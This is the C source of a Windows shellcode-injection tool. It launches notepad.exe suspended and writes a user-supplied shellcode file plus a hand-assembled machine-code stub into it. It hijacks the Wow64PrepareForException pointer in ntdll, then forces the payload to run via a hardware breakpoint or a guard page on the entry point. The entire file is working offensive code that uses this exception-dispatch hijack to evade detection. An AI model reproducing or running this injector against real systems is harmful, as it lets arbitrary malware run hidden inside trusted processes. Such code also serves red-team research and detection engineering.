#include <Windows.h>
#include <stdio.h>
#include "wow64_callback.h"
#include "structs.h"

unsigned char stub[] = { 0x4C, 0x8B, 0xDC, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48, 0xB8, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x49, 0xC7, 0x43, 0x18, 0x08, 0x00, 0x00, 0x00, 0x49, 0x89, 0x43, 0x20, 0x4D, 0x8D, 0x43, 0x18, 0x49, 0x8D, 0x43, 0x08, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00, 0x41, 0xB9, 0x04, 0x00, 0x00, 0x00, 0x49, 0x89, 0x43, 0xE8, 0x49, 0x8D, 0x53, 0x20, 0xC7, 0x44, 0x24, 0x48, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC9, 0xFF, 0x48, 0xBF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0xD7, 0x33, 0xC0, 0x4C, 0x8D, 0x44, 0x24, 0x50, 0x48, 0xA3, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x8D, 0x54, 0x24, 0x58, 0x44, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x8D, 0x44, 0x24, 0x48, 0x48, 0x83, 0xC9, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x20, 0xFF, 0xD7, 0x33, 0xC9, 0x48, 0xB8, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xFF, 0xD0, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3 };

BOOL FileRead(PSTR fileName, PVOID* buffer, PSIZE_T bufferLength) {

    HANDLE fileHandle = NULL;
    DWORD  bytesRead = 0x00;

    if ((fileHandle = CreateFileA(fileName, 
                                  GENERIC_READ, 
                                  0, 
                                  NULL, 
                                  OPEN_EXISTING, 
                                  FILE_ATTRIBUTE_NORMAL, 
                                  NULL)) == INVALID_HANDLE_VALUE) {
		printf("[ - ] CreateFileA Failed with error: %lx\n", GetLastError());
        CloseHandle(fileHandle);
        return FALSE;
    }
    
    if ((*bufferLength = GetFileSize(fileHandle, NULL)) == INVALID_FILE_SIZE) {
		printf("[ - ] GetFileSize Failed with error: %lx\n", GetLastError());
        CloseHandle(fileHandle);
		return FALSE;
    }

    if (!(*buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *bufferLength))) {
		printf("[ - ] HeapAlloc Failed with error: %lx\n", GetLastError());
        CloseHandle(fileHandle);
        return FALSE;
    }

    if (!ReadFile(fileHandle, *buffer, *bufferLength, &bytesRead, NULL) || *bufferLength != bytesRead) {
		printf("[ - ] ReadFile Failed with error: %lx\n", GetLastError());
        CloseHandle(fileHandle);
        return FALSE;
    }

    CloseHandle(fileHandle);
    return TRUE;
}

VOID SetHardwareBreakpoint(HANDLE remoteThread) {

    NTSTATUS status = 0x00;

    DWORD64 ntTestAlertAddress = (DWORD64)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");
    printf("[ + ] NtTestAlert Address: %p\n", ntTestAlertAddress);

    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    context.Dr0 = ntTestAlertAddress;
    context.Dr7 = 0x00000001;

    if (!SetThreadContext(remoteThread, &context)) {
        printf("[ - ] SetThreadContext Failed: %lx\n", GetLastError());
        return;
    }
}

//
// read the PEB from the remote process, get DOS + NT headers and return entry point
//

PVOID ReturnRemoteProcessEntryPoint(HANDLE processHandle) {
    PROCESS_BASIC_INFORMATION	pbi = { 0 };
    NTSTATUS					status = 0x00;
    ULONG						returnLength = 0;
    PEB							peb = { 0 };
    SIZE_T						bytesRead = NULL;

	HMODULE module = GetModuleHandleA("ntdll.dll");
    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(module, "NtQueryInformationProcess");
	_NtReadVirtualMemory NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(module, "NtReadVirtualMemory");

    printf("[ * ] Reading remote PEB ...\n");

    if ((status = NtQueryInformationProcess(processHandle, 
                                            ProcessBasicInformation, 
                                            &pbi, 
                                            sizeof(PROCESS_BASIC_INFORMATION), 
                                            &returnLength)) != 0x00) {
        
        printf("[ - ] NtQueryInformationProcess Failed with error: 0x%0.8X", status);
        return NULL;
    }

    if ((status = NtReadVirtualMemory(processHandle, 
                                      (PVOID)pbi.PebBaseAddress, 
                                      &peb, 
                                      sizeof(PEB), 
                                      &bytesRead)) != 0x00) {

        printf("[ - ] NtReadVirtualMemory Failed with error: 0x%0.8X\n", status);
        return NULL;
    }
   
    printf("[ + ] Remote process' PEB is located at 0x%p.\n", pbi.PebBaseAddress);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IMAGE_DOS_HEADER));
	if ((status = NtReadVirtualMemory(processHandle, 
                                      (PVOID)peb.ImageBaseAddress, 
                                      dosHeader, 
                                      sizeof(IMAGE_DOS_HEADER), 
                                      &bytesRead)) != 0x00) {
		printf("[ - ] NtReadVirtualMemory Failed with error: 0x%0.8X\n", status);
		return NULL;
	}
    
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[ - ] Invalid DOS header signature.\n");
		return NULL;
	}
    
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PIMAGE_NT_HEADERS));
    if ((status = NtReadVirtualMemory(processHandle, 
                                      (PVOID)((ULONG_PTR)peb.ImageBaseAddress + dosHeader->e_lfanew), 
                                      ntHeaders, sizeof(IMAGE_NT_HEADERS), 
                                      &bytesRead)) != 0x00) {
        printf("[ - ] NtReadVirtualMemory Failed with error: 0x%0.8X\n", status);
        return NULL;
    }
	
	PVOID entryPoint = (PVOID)((ULONG_PTR)(ntHeaders->OptionalHeader.AddressOfEntryPoint) + (ULONG_PTR)peb.ImageBaseAddress);

    printf("[ + ] Remote process entry point is located at 0x%p.\n", entryPoint);
	
	return entryPoint;
}

int main(int argc, char* argv[]) {
    
    PVOID payload = NULL;
	SIZE_T payloadLength = 0x00;
    NTSTATUS status = 0x00;

	if (argc < 3) {
		printf("\n[ - ] Not enough arguments\n");
        printf("\tUsage: KiUserExceptionDispatcherInjection.exe <shellcode.bin> <hwbp | page_guard>\n\n");
		return 0;
	}

	PCHAR method = argv[2];
	if (strcmp(method, "hwbp") != 0 && strcmp(method, "page_guard") != 0) {
		printf("\n[ - ] Invalid method specified. Use 'hwbp' or 'page_guard'\n");
        printf("\tUsage: KiUserExceptionDispatcherInjection.exe <shellcode.bin> <hwbp | page_guard>\n\n");
		return -1;
	}

    if (!FileRead(argv[1], &payload, &payloadLength)) {
        printf("[ - ] FileRead Failed\n");
        HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, payload);
        payload = NULL;
        payloadLength = 0;
        return -1;
    }

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    PVOID wow64PrepareForException = ReturnWow64FunctionPointer((PBYTE)ntdll);
    if (wow64PrepareForException == NULL) {
        printf("[ - ] Failed to get Wow64PrepareForException function pointer\n");
        return NULL;
    }

	printf("[ + ] Wow64PrepareForException function pointer: %p\n", wow64PrepareForException);

    PROCESS_INFORMATION processInfo = { 0 };
    STARTUPINFOA        startupInfo = { 0 };

    RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));

    startupInfo.cb = sizeof(startupInfo);

    if (!CreateProcessA(NULL, 
                        LPSTR("notepad.exe"), 
                        NULL, 
                        NULL, 
                        FALSE, 
                        CREATE_SUSPENDED, 
                        NULL, 
                        NULL, 
                        &startupInfo, 
                        &processInfo)) {
        printf("[ - ] CreateProcessA Failed: %d\n", GetLastError());
        return -1;
    }

    HANDLE remoteThread = processInfo.hThread;

    printf("[ + ] Process ID: %d\n", processInfo.dwProcessId);
    printf("[ + ] Thread ID: %d\n", processInfo.dwThreadId);

    PVOID shellcodeAddress = NULL;
    PVOID stubAddress = NULL;
    SIZE_T outSize = payloadLength;
	SIZE_T stubSize = sizeof(stub);

    _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	PVOID NtProtectVirtualMemory = GetProcAddress(ntdll, "NtProtectVirtualMemory");

    // allocate memory for the payload
    if ((status = NtAllocateVirtualMemory(processInfo.hProcess, 
                                          &shellcodeAddress, 
                                          0, 
                                          &outSize, 
                                          MEM_RESERVE | MEM_COMMIT, 
                                          PAGE_EXECUTE_READWRITE)) != 0x00) {

        printf("[ - ] NtAllocateVirtualMemory Failed: %lx\n", status);
        return -1;
    }

    printf("[ + ] Memory for shellcode allocated at: %p\n", shellcodeAddress);

    if ((status = NtAllocateVirtualMemory(processInfo.hProcess, 
                                          &stubAddress, 
                                          0, 
                                          &stubSize, 
                                          MEM_RESERVE | MEM_COMMIT, 
                                          PAGE_EXECUTE_READWRITE)) != 0x00) {

        printf("[ - ] NtAllocateVirtualMemory Failed: %lx\n", status);
        return -1;
    }
    
	printf("[ + ] Memory for stub allocated at: %p\n", stubAddress);

    //
	// prepare the stub
    //

    memcpy(&stub[74], &NtProtectVirtualMemory, sizeof(PVOID));
	memcpy(&stub[10], &wow64PrepareForException, sizeof(PVOID));
    memcpy(&stub[93], &wow64PrepareForException, sizeof(PVOID));
	memcpy(&stub[131], &shellcodeAddress, sizeof(PVOID));

    SIZE_T bytesWritten = 0;

    //
	// write the payload into the allocated memory
    //

    if ((status = NtWriteVirtualMemory(processInfo.hProcess, 
                                       shellcodeAddress, 
                                       payload, 
                                       payloadLength, 
                                       &bytesWritten)) != 0x00) {

        printf("[ - ] NtWriteVirtualMemory [payload] Failed: %lx\n", status);
        return -1;
    }

    //
	// write the stub into the allocated memory
    //

    if ((status = NtWriteVirtualMemory(processInfo.hProcess, 
                                       stubAddress, 
                                       stub, 
                                       stubSize, 
                                       &bytesWritten)) != 0x00) {

        printf("[ - ] NtWriteVirtualMemory [stub] Failed: %lx\n", status);
        return -1;
    }

    //
	// write the pointer to the stub into the Wow64PrepareForException function
    //

    if ((status = NtWriteVirtualMemory(processInfo.hProcess, 
                                       wow64PrepareForException, 
                                       &stubAddress, 
                                       sizeof(PVOID), 
                                       &bytesWritten)) != 0x00) {

        printf("[ - ] NtWriteVirtualMemory [pointer] Failed: %lx\n", status);
        return -1;
    }

    printf("[ + ] Pointer to shellcode written to: %p\n", wow64PrepareForException);

	if (strcmp(method, "hwbp") == 0) {
		SetHardwareBreakpoint(remoteThread);
	}
	else {
        
        DWORD oldProtect = 0x00;
        PVOID entryPoint = ReturnRemoteProcessEntryPoint(processInfo.hProcess);
        if (entryPoint == NULL) {
            printf("[ - ] ReturnRemoteProcessEntryPoint Failed\n");
            return -1;
        }

        if (!VirtualProtectEx(processInfo.hProcess, entryPoint, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect)) {
            printf("[ - ] VirtualProtectEx Failed: %d\n", GetLastError());
            return -1;
        }
        
	}

    if (!ResumeThread(remoteThread)) {
        return -1;
    }

    printf("[ + ] Process Resumed\n");
    WaitForSingleObject(processInfo.hProcess, INFINITE);

    return 0;
}